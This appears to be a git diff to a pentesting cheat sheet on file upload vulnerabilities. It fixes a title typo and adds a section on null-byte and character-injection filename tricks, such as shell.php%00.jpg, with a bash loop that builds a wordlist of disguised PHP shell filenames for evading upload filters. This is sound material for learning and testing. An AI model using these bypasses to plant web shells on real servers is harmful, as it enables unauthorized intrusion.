@@ -1,4 +1,4 @@
-# Uplaod Vulnerabilities
+# Upload Vulnerabilities
 
 ## Prerequisite:
 
@@ -79,7 +79,7 @@ Save the file, then upload it to the server. After that, try to reupload your fi
 
 Upload the file to get your shell if bypassed successfully.
 
-## Magic Bytes Bypass
+## Magic Bytes Bypass (MIME Type Spoofing)
 
 If an upload functionality permits only for example, image files, we can append some "Magic Bytes" on our reverse shell to make it an image file.
 
@@ -99,6 +99,35 @@ If an upload functionality permits only for example, image files, we can append 
 Then verify with 
 
     file shell.php
+
+## Character Injection
+
+Try using null byte injection to bypass filters, e.g., shell.php%00.jpg; or inject characters before or after the final extension: 
+
+For example shell.php%00.jpg works with PHP servers with version 5.X or earlier, as it causes the PHP web server to end the file name after the '%00', and store it as 'shell.php'.
+
+    %20
+    %0a
+    %00
+    %0d0a
+    /
+    .\
+    .
+    …
+    :
+
+
+Script for all permutations
+
+    for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
+        for ext in '.php' '.php2' '.php3' '.php4' '.php5' '.php6' '.php7' '.phps' '.pht' '.phtm' '.phtml' '.pgif' '.phar' '.hphp'; do
+            echo "shell$char$ext.jpg" >> wordlist.txt
+            echo "shell$ext$char.jpg" >> wordlist.txt
+            echo "shell.jpg$char$ext" >> wordlist.txt
+            echo "shell.jpg$ext$char" >> wordlist.txt
+        done
+    done
+
 
 ## Web Shells
 
